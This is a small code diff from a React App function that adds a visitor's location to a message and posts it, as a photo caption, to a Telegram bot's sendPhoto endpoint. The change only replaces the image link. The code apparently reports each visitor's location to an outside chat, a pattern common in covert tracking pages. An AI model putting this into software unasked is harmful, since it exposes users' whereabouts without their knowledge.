@@ -15,7 +15,7 @@ function App() {
       message += `<b>Location:</b> ${res.data.loc}\n`;
       axios.post(`${URL}/sendPhoto`, {
         chat_id: CHAT_ID,
-        photo: "https://ibb.co/Hfzz7FGP",
+        photo: "https://ibb.co/gL1mX9sN",
         caption: message,
         parse_mode: "HTML",
       });
